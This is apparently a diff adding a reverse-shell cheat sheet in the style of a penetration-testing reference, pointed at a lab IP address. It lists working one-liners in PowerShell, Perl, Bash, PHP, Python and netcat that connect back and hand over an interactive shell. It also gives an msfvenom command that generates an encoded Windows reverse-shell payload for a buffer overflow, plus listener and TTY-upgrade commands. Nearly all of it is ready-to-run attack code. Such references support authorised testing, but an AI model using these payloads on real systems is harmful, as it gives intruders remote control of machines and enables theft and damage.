@@ -1,0 +1,50 @@
+Powershell (reverse.ps1):
+
+$client = New-Object System.Net.Sockets.TCPClient("192.168.174.128",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+For BoF on Windows target:
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.174.128 LPORT=80 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x40"
+
+Listener: nc -nlvp 443
+
+
+Perl:
+
+perl -e 'use Socket;$i="192.168.174.128";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+Bash:
+
+bash -i >& /dev/tcp/192.168.174.128/80 0>&1
+
+
+PHP:
+
+php -r '$sock=fsockopen("192.168.174.128",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+Python:
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.174.128",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+Netcat:
+
+nc -e /bin/sh 192.168.174.128 80
+nc.exe 192.168.174.128 80 -e cmd.exe
+
+
+Upgrade Shell to TTY:
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+Sources:
+
+https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e
+https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/
